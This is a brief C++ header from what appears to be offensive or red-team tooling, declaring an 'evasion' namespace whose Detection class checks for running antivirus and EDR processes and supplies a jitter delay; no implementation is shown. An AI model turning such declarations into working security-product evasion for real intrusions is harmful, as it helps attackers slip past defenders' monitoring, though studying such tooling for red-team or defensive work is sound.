#pragma once
#include <vector>
#include <string>

namespace evasion {

class Detection {
public:
    static bool IsAVPresent();
    static bool IsEDRPresent();
    static int GetJitterDelay();

private:
    static bool IsProcessRunning(const std::string& processName);
};

} // namespace evasion
